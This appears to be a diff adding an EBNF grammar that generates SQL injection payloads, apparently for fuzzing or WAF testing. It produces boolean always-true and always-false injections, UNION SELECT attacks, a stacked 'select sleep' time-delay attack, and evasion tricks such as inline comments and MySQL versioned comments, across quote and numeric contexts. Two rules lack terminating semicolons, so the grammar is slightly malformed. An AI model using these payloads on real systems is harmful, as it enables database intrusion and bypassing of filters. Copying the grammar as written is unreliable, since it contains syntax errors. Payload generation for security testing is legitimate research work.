@@ -1,0 +1,75 @@
+terOne = "1" ;
+terSQuote = "'" ;
+terDQuote = "\"" ;
+terDigitZero = "0" ;
+terDigitOne = "1" ;
+terDigitExcludingZero = terDigitOne | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" ;
+terDigitIncludingZero = terDigitZero | terDigitExcludingZero ;
+terChar = "a";
+
+# SQL Operators and Keyword
+opNot = "!" | "not" ;
+opBinInvert = "~" ;
+opEqual = "=" ;
+opLt = "<" ;
+opGt = ">" ;
+opLike = "like" ;
+opIs = "is" ;
+opMinus = "-" ;
+opOr = "or" | "||" ;
+opAnd = "and" | "&&" ;
+opSel = "select"
+opUni = "union" ;
+opSem = ";" ;
+
+# SQL functions
+parOpen = "(";
+funcSleep = "sleep" , parOpen , terDigitExcludingZero , par ;
+
+# Syntax-repairing
+par = ")" ;
+cmt = "#" | "--", blank
+
+# Obfuscation
+inlineCmt = "/**/" ;
+blank = " " ;
+wsp = blank | inlineCmt ;
+
+### Boolean-based Attacks ### 
+
+# boolean values which evaluate to true
+# trueConst = "true" | "tr" , [inlineCmt] , "ue";
+trueConst = "true" ; 
+trueAtom = trueConst | terDigitOne ;
+unaryTrue = wsp, trueAtom | wsp, opNot, wsp, falseAtom | opBinInvert, wsp, falseAtom | opBinInvert, wsp, trueAtom ;
+binaryTrue = unaryTrue, opEqual, wsp, parOpen, unaryTrue, par | unaryFalse, opEqual, wsp, parOpen, unaryFalse, par | terSQuote, terChar, terSQuote, opEqual, terSQuote, terChar, terSQuote | terDQuote, terChar, terDQuote, opEqual, terDQuote, terChar, terDQuote | unaryFalse, opLt, parOpen, unaryTrue, par | unaryTrue, opGt, parOpen, unaryFalse, par | wsp, trueAtom, wsp, opLike, wsp, trueAtom | unaryTrue, wsp, opIs, wsp, trueConst | unaryFalse, wsp, opIs, wsp, falseConst | unaryTrue, opMinus, parOpen, unaryFalse, par ;  
+booleanTrueExpr = unaryTrue | binaryTrue ;
+
+# boolean values which evaluate to false
+# falseConst = "false" | "fa" , [inlineCmt] , "lse";
+falseConst = "false" ;
+falseAtom = wsp, falseConst |  wsp, terDigitZero | terSQuote, terSQuote ;
+unaryFalse = falseAtom | wsp, opNot, wsp, trueAtom | wsp, opNot, opBinInvert, falseAtom ;
+booleanFalseExpr = unaryFalse ;
+
+orAttack = opOr, booleanTrueExpr ;
+andAttack = opAnd, booleanFalseExpr ;
+booleanAttack = orAttack | andAttack ;
+
+### Union Attacks ###
+cols = terDigitZero;
+unionPostfix = "all", wsp | "distinct", wsp;
+union = opUni | "/*!", ["50000"], opUni, "*/" ;
+unionAttack = union, wsp, [unionPostfix], opSel, wsp, cols | union, wsp, [unionPostfix] , parOpen, opSel, wsp, cols,par ;
+
+### Piggy-backed Attacks ###
+piggyAttack = opSem, opSel, wsp, funcSleep;
+
+### Injection Context ###
+sqliAttack = unionAttack | piggyAttack | booleanAttack ;
+
+numericContext = terDigitZero, wsp, booleanAttack, wsp | terDigitZero, par, wsp, booleanAttack, wsp, opOr, parOpen, terDigitZero | terDigitZero, [par], wsp, sqliAttack, cmt ;
+sQuoteContext = terSQuote, wsp, booleanAttack, wsp, opOr, terSQuote | terSQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terSQuote | terSQuote, [par], wsp, sqliAttack, cmt ;
+dQuoteContext = terDQuote, wsp, booleanAttack, wsp, opOr, terDQuote | terDQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terDQuote | terDQuote, [par], wsp, sqliAttack, cmt ;
+
+start = numericContext | sQuoteContext | dQuoteContext;
